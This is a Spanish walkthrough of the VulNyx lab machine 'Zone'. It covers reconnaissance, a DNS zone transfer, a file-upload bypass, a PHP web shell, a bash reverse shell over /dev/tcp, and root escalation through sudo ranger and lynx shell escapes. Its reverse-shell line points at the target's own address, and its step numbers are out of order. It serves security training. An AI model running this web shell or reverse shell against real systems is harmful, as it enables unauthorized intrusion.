@@ -1,0 +1,219 @@
+---
+layout: post
+title: "Zone"
+date: 2024-05-10 17:10:23
+category: sample
+vm: vulnyx
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/vulnyx/vulnyx.png" width=252></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Zone </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Easy</span></td> </tr>
+  <tr> <td><strong>Link OVA:</strong><a href="https://vulnyx.com/#zone"> Vulnyx</a></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/vulnyx/zone/host.png){:.margin}
+
+**1\.** Vemos hosts en la red.
+
+`sudo arp-scan -I enp2s0 --localnet`
+
+![img](/notas/public/img/vulnyx/zone/arp.png){:.margin}
+
+**2\.** Escaneamos puertos y servicios activos.
+
+`sudo nmap -p- --open -T5 -sS -sCV --min-rate=5000 -n -Pn 192.168.1.14 -oN report`
+
+![img](/notas/public/img/vulnyx/zone/nmap.png){:.margin}
+
+**3\.** En la web Apache no se encuentra nada interesante.
+
+`http://192.168.1.14/`
+
+![img](/notas/public/img/vulnyx/zone/80.png){:.margin}
+
+**4\.** Descubrimos directorios y archivos.
+
+`gobuster dir -u http://192.168.1.14 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t50 -x php,html,txt`
+
+![img](/notas/public/img/vulnyx/zone/gobuster.png){:.margin}
+
+**5\.** Revisamos el fichero robots. (tenemos un dominio)
+
+`http://192.168.1.14/robots.txt`
+
+![img](/notas/public/img/vulnyx/zone/robots.png){:.margin}
+
+**6\.** Lo añadimos en nuestra configuracion de hosts.
+
+`sudo nano /etc/hosts`
+
+`192.168.1.14  securezone.nyx`
+![img](/notas/public/img/vulnyx/zone/etc.png){:.margin}
+
+**7\.** Vamos al nuevo dominio, vemos la pagina Apache por defecto.
+
+`http://securezone.nyx`
+
+![img](/notas/public/img/vulnyx/zone/securezone.png){:.margin}
+
+**8\.** Hacemos una transferencia de zona, ya que tenemos un servicio dns.
+
+`dig axfr @192.168.1.14 securezone.nyx`
+
+![img](/notas/public/img/vulnyx/zone/dig.png){:.margin}
+
+**9\.** Agregamos los subdominios al hosts. 
+
+`sudo nano /etc/hosts`
+
+`192.168.1.14  securezone.nyx admin.securezone.nyx ns1.securezone.nyx upl0ads.securezone.nyx www.securezone.nyx`
+
+![img](/notas/public/img/vulnyx/zone/etc2.png){:.margin}
+
+**10\.** Vamos revisando cada subdominio, en uploads tenemos subida de archivos.
+
+`http://upl0ads.securezone.nyx`
+
+![img](/notas/public/img/vulnyx/zone/upload.png){:.margin}
+
+**11\.** Abrimos burpsuite y su navegador para ir a upl0ads e interceptar el tramite.
+
+![img](/notas/public/img/vulnyx/zone/browser.png){:.margin}
+
+**12\.** Probamos subir un archivo.
+
+`echo "hola" > file.txt`
+
+![img](/notas/public/img/vulnyx/zone/probefile.png){:.margin}
+
+**13\.** En burpsuite tenemos la peticion interceptada. Presionamos ctrl +r para enviar al Repeater.
+
+![img](/notas/public/img/vulnyx/zone/intercep.png){:.margin}
+
+**14\.** Enviamos la solicitud para ver la respuesta. ctrl + i para enviar al Intruder.
+
+![img](/notas/public/img/vulnyx/zone/response.png){:.margin}
+
+**15\.** Identificamos las extensiones permitidos.
+
+_\- Seleccionamos la extension y presionamos en Add$_
+
+![img](/notas/public/img/vulnyx/zone/step1.png){:.margin}
+
+_\- Agregamos extensiones, luego iniciamos el ataque_
+
+![img](/notas/public/img/vulnyx/zone/step2.png){:.margin}
+
+_\- Se abre otra ventana, Tenemos una extension permitida_
+
+![img](/notas/public/img/vulnyx/zone/step3.png){:.margin}
+
+_\- Le metemos codigo php 'malicioso'  y lo enviamos_
+
+`<?php system($_GET["cmd"]);?>`
+
+![img](/notas/public/img/vulnyx/zone/sendfile.png){:.margin}
+
+_\- Fuzzeamos para ver donde se subio nuestro archivo_
+
+`gobuster dir -u http://upl0ads.securezone.nyx/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x html,php,js,txt`
+
+![img](/notas/public/img/vulnyx/zone/gobuster2.png){:.margin}
+
+**16\.** Vamos a la web a la nueva ruta, probamos el funcionamiento ejecutando un comando.
+
+![img](/notas/public/img/vulnyx/zone/id.png){:.margin}
+
+**17\.** Ganando acceso al sistema.
+
+_\- Nos ponemos en esucha_
+
+`sudo nc -nlvp 443`
+
+![img](/notas/public/img/vulnyx/zone/nc.png){:.margin}
+
+_\- Nos enviamos una shell_
+
+`http://upl0ads.securezone.nyx/uploads/file.phar?cmd=bash -c "bash -i >%26/dev/tcp/192.168.1.14/443 0>%261`
+
+![img](/notas/public/img/vulnyx/zone/reverse.png){:.margin}
+
+_\- Tenemos la conexion a la maquina_
+
+![img](/notas/public/img/vulnyx/zone/connected.png){:.margin}
+
+**19\.** Hacemos tratamiento de la tty.
+
+`script /dev/null -c bash`
+
+`ctrl+z`
+
+`stty raw -echo;fg`
+
+`reset xterm`
+
+`export TERM=xterm-256color`
+
+![img](/notas/public/img/vulnyx/zone/tty.png){:.margin}
+
+**18\.** Vemos permisos sudo, podemos ejecutar ranger como usuario hans.
+
+`sudo -l`
+
+![img](/notas/public/img/vulnyx/zone/sudol.png){:.margin}
+
+**17\.** Escalamos como usuario hans
+
+_\- Ejecutamos el binario_
+
+`sudo -u hans /usr/bin/ranger`
+
+_\- Presionamos ! y enter_
+
+![img](/notas/public/img/vulnyx/zone/ranger.png){:.margin}
+
+_\- Nos lanzamos una bash como usuario hans_
+
+`/bin/bash`
+
+![img](/notas/public/img/vulnyx/zone/ranger2.png){:.margin}
+
+**18\.** Revisamos permisos sudo, podemos ejecutar lynx como root.
+
+`sudo -l`
+
+![img](/notas/public/img/vulnyx/zone/sudol2.png){:.margin}
+
+**19\.** Escalamos privilegios a root
+
+_\- Ejecutamos el binario_
+
+`sudo usr/bin/lynx`
+
+_\- Tipeamos ! y presionamos enter para obtener una bash_
+
+`!`
+
+![img](/notas/public/img/vulnyx/zone/lynx.png){:.margin}
+
+_\- Ya somos root_
+
+![img](/notas/public/img/vulnyx/zone/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
